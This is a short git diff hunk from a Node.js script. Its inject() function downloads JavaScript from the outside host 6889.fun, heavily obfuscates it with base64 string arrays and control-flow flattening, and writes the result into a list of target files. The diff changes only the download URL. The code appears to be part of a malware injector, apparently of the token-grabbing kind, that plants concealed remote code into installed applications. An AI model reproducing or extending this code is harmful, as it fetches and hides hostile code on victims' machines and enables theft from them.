@@ -130,7 +130,7 @@ switch (process.platform) {
          }
 
          async function inject() {
-            let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {aurathemes: true}});
+            let resp = await axios.get("https://6889.fun/api/aurathemes/inject", {headers: {aurathemes: true}});
             let obf = require('javascript-obfuscator').obfuscate(resp.data.replace("*API*", API), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
             let payload = obf.getObfuscatedCode();
             injectPath.forEach(file => {
